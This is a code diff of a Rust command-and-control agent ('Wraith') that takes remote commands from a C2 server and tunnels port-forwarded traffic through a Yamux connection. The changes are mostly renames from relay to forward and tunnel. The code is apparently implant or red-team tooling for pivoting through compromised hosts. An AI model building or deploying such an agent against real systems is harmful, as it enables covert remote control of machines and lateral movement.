@@ -1,15 +1,15 @@
 //! Wraith agent — dual-connection client.
 //!
 //! Connections:
-//! - C2 connection (to Nexus): sends WraithRegistration, then reads NexusCommand protos
-//!   and dispatches to command handlers (execute, upload, download).
-//! - Relay connection (to wraith relay binary): Yamux Mode::Client on same TCP socket.
-//!   Handles channels 0 (tunnel data), 3 (relay data), 5 (relay control).
+//! - C2 connection (to PyWraith C2): sends WraithRegistration, then reads NexusCommand protos
+//!   and dispatches to command handlers (execute, upload, download, add_forward).
+//! - Tunnel connection (to tserver): Yamux Mode::Client on same TCP socket.
+//!   Handles channels 0 (tunnel data), 3 (forward data), 5 (forward control).
 //!
 //! Wire format: [4-byte u32 BE length][protobuf bytes]
 
 use crate::proto::*;
-use crate::tunnel::channel::{RELAY_CONTROL, RELAY_DATA, TUNNEL_DATA};
+use crate::tunnel::channel::{FORWARD_CONTROL, FORWARD_DATA, TUNNEL_DATA};
 use crate::tunnel::framing::{FramedReader, FramedWriter};
 use crate::wraith::Config;
 use futures::{AsyncReadExt as FutAsyncReadExt, AsyncWriteExt as FutAsyncWriteExt};
@@ -132,7 +132,7 @@ impl Default for AgentTunnel {
 
 /// Relay stats for port-forward relay traffic.
 #[derive(Debug, Default)]
-pub struct RelayStatsData {
+pub struct ForwardStats {
     pub bytes_in: u64,
     pub bytes_out: u64,
     pub connections: u64,
@@ -181,9 +181,9 @@ pub struct AgentClient {
     config: Config,
     sys_info: SystemInfo,
     /// Yamux connection to relay (for tunnel + relay channels)
-    relay_conn: Arc<tokio::sync::Mutex<Option<Connection<Compat<TcpStream>>>>>,
+    tunnel_conn: Arc<tokio::sync::Mutex<Option<Connection<Compat<TcpStream>>>>>,
     tunnels: Arc<RwLock<HashMap<String, AgentTunnel>>>,
-    relays: Arc<RwLock<HashMap<String, RelayStatsData>>>,
+    forwards: Arc<RwLock<HashMap<String, ForwardStats>>>,
     /// Active TCP listeners spawned by add_relay command
     relay_listeners: Arc<RwLock<HashMap<String, tokio::net::TcpListener>>>,
     commands_executed: Arc<RwLock<u32>>,
@@ -198,9 +198,9 @@ impl AgentClient {
         Self {
             config,
             sys_info,
-            relay_conn: Arc::new(tokio::sync::Mutex::new(None)),
+            tunnel_conn: Arc::new(tokio::sync::Mutex::new(None)),
             tunnels: Arc::new(RwLock::new(HashMap::new())),
-            relays: Arc::new(RwLock::new(HashMap::new())),
+            forwards: Arc::new(RwLock::new(HashMap::new())),
             relay_listeners: Arc::new(RwLock::new(HashMap::new())),
             commands_executed: Arc::new(RwLock::new(0)),
             heartbeat_interval: 30,
@@ -212,8 +212,8 @@ impl AgentClient {
         self.tunnels.clone()
     }
 
-    pub fn relays(&self) -> Arc<RwLock<HashMap<String, RelayStatsData>>> {
-        self.relays.clone()
+    pub fn forwards(&self) -> Arc<RwLock<HashMap<String, ForwardStats>>> {
+        self.forwards.clone()
     }
 
     pub fn set_tunnel_channel(&mut self, tx: mpsc::Sender<(String, Vec<u8>)>) {
@@ -539,8 +539,8 @@ impl AgentClient {
         // TODO: store listener in HashMap for management (TcpListener doesn't impl Clone)
 
         // Spawn task to accept connections and bridge them
-        let relay_conn = self.relay_conn.clone();
-        let relays = self.relays.clone();
+        let tunnel_conn = self.tunnel_conn.clone();
+        let forwards = self.forwards.clone();
         let relay_id_clone = relay_id.clone();
         let connect_addr_clone = connect_addr.clone();
 
@@ -549,13 +549,13 @@ impl AgentClient {
                 match listener.accept().await {
                     Ok((tcp_stream, peer)) => {
                         log::info!("Relay {}: incoming connection from {}", relay_id_clone, peer);
-                        let relays = relays.clone();
-                        let relay_conn = relay_conn.clone();
+                        let forwards = forwards.clone();
+                        let tunnel_conn = tunnel_conn.clone();
                         let relay_id = relay_id_clone.clone();
                         let connect_addr = connect_addr_clone.clone();
 
                         tokio::spawn(async move {
-                            if let Err(e) = handle_relay_connection(tcp_stream, relay_conn, relays, relay_id, connect_addr).await {
+                            if let Err(e) = handle_forward_connection(tcp_stream, tunnel_conn, forwards, relay_id, connect_addr).await {
                                 log::warn!("Relay connection error: {}", e);
                             }
                         });
@@ -608,7 +608,7 @@ impl AgentClient {
     /// Connect TCP to relay, upgrade to Yamux, and run the relay session.
     pub async fn connect_with_reconnect(&mut self) -> anyhow::Result<()> {
         loop {
-            match self.connect_relay().await {
+            match self.connect_tunnel().await {
                 Ok(_) => return Ok(()),
                 Err(e) => {
                     if self.config.reconnect {
@@ -622,16 +622,16 @@ impl AgentClient {
         }
     }
 
-    /// Connect TCP to the relay server and establish Yamux client connection.
-    async fn connect_relay(&mut self) -> anyhow::Result<()> {
-        let addr = format!("{}:{}", self.config.relay_host, self.config.relay_port);
-        log::info!("Connecting to relay at {}", addr);
+    /// Connect TCP to the tunnel server and establish Yamux client connection.
+    async fn connect_tunnel(&mut self) -> anyhow::Result<()> {
+        let addr = format!("{}:{}", self.config.tunnel_host, self.config.tunnel_port);
+        log::info!("Connecting to tunnel server at {}", addr);
 
         let stream = TcpStream::connect(&addr).await?;
         let compat = stream.compat();
         let config = YamuxConfig::default();
         let conn = Connection::new(compat, config, Mode::Client);
-        *self.relay_conn.lock().await = Some(conn);
+        *self.tunnel_conn.lock().await = Some(conn);
 
         log::info!("Relay Yamux client connection established");
         Ok(())
@@ -642,7 +642,7 @@ impl AgentClient {
         loop {
             // Ensure connected
             {
-                let conn_guard = self.relay_conn.lock().await;
+                let conn_guard = self.tunnel_conn.lock().await;
                 if conn_guard.is_none() {
                     drop(conn_guard);
                     self.connect_with_reconnect().await?;
@@ -653,7 +653,7 @@ impl AgentClient {
             // Poll for inbound stream with a timeout
             let stream_opt = tokio::time::timeout(
                 tokio::time::Duration::from_secs(1),
-                self.poll_inbound_relay(),
+                self.poll_inbound_tunnel(),
             ).await;
 
             match stream_opt {
@@ -662,11 +662,11 @@ impl AgentClient {
                     if let Some(mut stream) = stream_opt.take() {
                         let channel_id = self.read_channel_id(&mut stream).await?;
                         let tunnels = self.tunnels.clone();
-                        let relays = self.relays.clone();
+                        let forwards = self.forwards.clone();
                         let tunnel_tx = self.tunnel_tx.clone();
 
                         tokio::spawn(async move {
-                            if let Err(e) = Self::handle_relay_stream(channel_id, stream, tunnels, relays, tunnel_tx).await {
+                            if let Err(e) = Self::handle_tunnel_stream(channel_id, stream, tunnels, forwards, tunnel_tx).await {
                                 log::warn!("Relay stream handler error: {}", e);
                             }
                         });
@@ -686,8 +686,8 @@ impl AgentClient {
     }
 
     /// Poll next inbound stream from relay Yamux connection.
-    async fn poll_inbound_relay(&self) -> anyhow::Result<Option<yamux::Stream>> {
-        let mut conn_guard = self.relay_conn.lock().await;
+    async fn poll_inbound_tunnel(&self) -> anyhow::Result<Option<yamux::Stream>> {
+        let mut conn_guard = self.tunnel_conn.lock().await;
         let conn_opt = conn_guard.as_mut();
         if conn_opt.is_none() {
             return Ok(None);
@@ -711,11 +711,11 @@ impl AgentClient {
     }
 
     /// Handle an inbound relay stream by channel ID.
-    async fn handle_relay_stream(
+    async fn handle_tunnel_stream(
         channel_id: u32,
         mut stream: yamux::Stream,
         tunnels: Arc<RwLock<HashMap<String, AgentTunnel>>>,
-        relays: Arc<RwLock<HashMap<String, RelayStatsData>>>,
+        forwards: Arc<RwLock<HashMap<String, ForwardStats>>>,
         tunnel_tx: Option<mpsc::Sender<(String, Vec<u8>)>>,
     ) -> anyhow::Result<()> {
         // Read the full framed payload into a buffer
@@ -748,14 +748,14 @@ impl AgentClient {
                     }
                 }
             }
-            RELAY_DATA => {
+            FORWARD_DATA => {
                 // Channel 3: relay data (raw bytes for port-forward)
                 log::trace!("Relay data channel received {} bytes", framed_bytes.len());
             }
-            RELAY_CONTROL => {
+            FORWARD_CONTROL => {
                 // Channel 5: relay control messages
                 if let Ok(ctrl) = RelayControl::decode(&*framed_bytes) {
-                    Self::handle_relay_control(ctrl, &mut stream, relays).await?;
+                    Self::handle_forward_control(ctrl, &mut stream, forwards).await?;
                 }
             }
             _ => {
@@ -767,10 +767,10 @@ impl AgentClient {
     }
 
     /// Handle relay control messages (RelayOpen/Close/Stats).
-    async fn handle_relay_control(
+    async fn handle_forward_control(
         ctrl: RelayControl,
         stream: &mut yamux::Stream,
-        relays: Arc<RwLock<HashMap<String, RelayStatsData>>>,
+        forwards: Arc<RwLock<HashMap<String, ForwardStats>>>,
     ) -> anyhow::Result<()> {
         use relay_control::Msg;
 
@@ -779,7 +779,7 @@ impl AgentClient {
                 log::info!("RelayOpen: {} (mode={}, local={}, remote={})",
                     open.relay_id, open.mode, open.local_addr, open.remote_addr);
 
-                relays.write().await.insert(open.relay_id.clone(), RelayStatsData::default());
+                forwards.write().await.insert(open.relay_id.clone(), ForwardStats::default());
 
                 let ack = RelayOpenAck {
                     relay_id: open.relay_id,
@@ -795,10 +795,10 @@ impl AgentClient {
             }
             Some(Msg::Close(close)) => {
                 log::info!("RelayClose: {} ({})", close.relay_id, close.reason);
-                relays.write().await.remove(&close.relay_id);
+                forwards.write().await.remove(&close.relay_id);
             }
             Some(Msg::StatsRequest(req)) => {
-                if let Some(relay) = relays.read().await.get(&req.relay_id) {
+                if let Some(relay) = forwards.read().await.get(&req.relay_id) {
                     let stats = RelayStats {
                         relay_id: req.relay_id.clone(),
                         bytes_in: relay.bytes_in,
@@ -813,7 +813,7 @@ impl AgentClient {
                 }
             }
             Some(Msg::List(_)) => {
-                let relays_list: Vec<relay_list_response::RelayInfo> = relays.read().await
+                let forwards_list: Vec<relay_list_response::RelayInfo> = forwards.read().await
                     .iter()
                     .map(|(id, stats)| relay_list_response::RelayInfo {
                         relay_id: id.clone(),
@@ -826,7 +826,7 @@ impl AgentClient {
                     .collect();
 
                 let response = RelayControl {
-                    msg: Some(Msg::ListResponse(RelayListResponse { relays: relays_list })),
+                    msg: Some(Msg::ListResponse(RelayListResponse { relays: forwards_list })),
                 };
                 let resp_bytes = response.encode_to_vec();
                 Self::send_framed_yamux(stream, &resp_bytes).await?;
@@ -894,9 +894,9 @@ impl AgentClient {
         Self {
             config: self.config.clone(),
             sys_info: self.sys_info.clone(),
-            relay_conn: Arc::new(tokio::sync::Mutex::new(None)),
+            tunnel_conn: Arc::new(tokio::sync::Mutex::new(None)),
             tunnels: self.tunnels.clone(),
-            relays: self.relays.clone(),
+            forwards: self.forwards.clone(),
             relay_listeners: self.relay_listeners.clone(),
             commands_executed: self.commands_executed.clone(),
             heartbeat_interval: self.heartbeat_interval,
@@ -910,9 +910,9 @@ impl Clone for AgentClient {
         Self {
             config: self.config.clone(),
             sys_info: self.sys_info.clone(),
-            relay_conn: Arc::new(tokio::sync::Mutex::new(None)),
+            tunnel_conn: Arc::new(tokio::sync::Mutex::new(None)),
             tunnels: self.tunnels.clone(),
-            relays: self.relays.clone(),
+            forwards: self.forwards.clone(),
             relay_listeners: self.relay_listeners.clone(),
             commands_executed: self.commands_executed.clone(),
             heartbeat_interval: self.heartbeat_interval,
@@ -922,20 +922,20 @@ impl Clone for AgentClient {
 }
 
 /// Handle an incoming connection on a relay listener — bridge it to the upstream relay.
-async fn handle_relay_connection(
+async fn handle_forward_connection(
     tcp_stream: TcpStream,
-    relay_conn: Arc<tokio::sync::Mutex<Option<Connection<Compat<TcpStream>>>>>,
-    relays: Arc<RwLock<HashMap<String, RelayStatsData>>>,
+    tunnel_conn: Arc<tokio::sync::Mutex<Option<Connection<Compat<TcpStream>>>>>,
+    forwards: Arc<RwLock<HashMap<String, ForwardStats>>>,
     relay_id: String,
     connect_addr: String,
 ) -> anyhow::Result<()> {
     // Update stats
-    if let Some(stats) = relays.write().await.get_mut(&relay_id) {
+    if let Some(stats) = forwards.write().await.get_mut(&relay_id) {
         stats.connections += 1;
     }
 
     // Get the relay connection and open a new Yamux stream
-    let mut conn_guard = relay_conn.lock().await;
+    let mut conn_guard = tunnel_conn.lock().await;
     let conn = match conn_guard.as_mut() {
         Some(c) => c,
         None => return Err(anyhow::anyhow!("relay not connected")),
@@ -945,7 +945,7 @@ async fn handle_relay_connection(
     let mut stream = PollOutbound { conn }.await
         .map_err(|e| anyhow::anyhow!("yamux poll_new_outbound: {}", e))?;
 
-    // Send RelayOpen on channel 5 (RELAY_CONTROL)
+    // Send RelayOpen on channel 5 (FORWARD_CONTROL)
     let open = RelayOpen {
         relay_id: relay_id.clone(),
         mode: "tcp".to_string(),
@@ -994,7 +994,7 @@ async fn bridge_tcp_to_yamux(
                 let data = &buf[..n];
                 let len = n as u32;
                 let mut framed = Vec::with_capacity(8 + n);
-                framed.extend_from_slice(&RELAY_DATA.to_be_bytes());
+                framed.extend_from_slice(&FORWARD_DATA.to_be_bytes());
                 framed.extend_from_slice(&len.to_be_bytes());
                 framed.extend_from_slice(data);
                 FutAsyncWriteExt::write_all(&mut yamux_stream, &framed).await?;
@@ -1020,7 +1020,7 @@ async fn bridge_tcp_to_yamux(
                     let channel_id = u32::from_be_bytes([buf[0], buf[1], buf[2], buf[3]]);
                     let len = u32::from_be_bytes([buf[4], buf[5], buf[6], buf[7]]) as usize;
 
-                    if channel_id == RELAY_DATA && n >= 8 + len {
+                    if channel_id == FORWARD_DATA && n >= 8 + len {
                         AsyncWriteExt::write_all(&mut tcp_write, &buf[8..8+len]).await?;
                         AsyncWriteExt::flush(&mut tcp_write).await?;
                     }
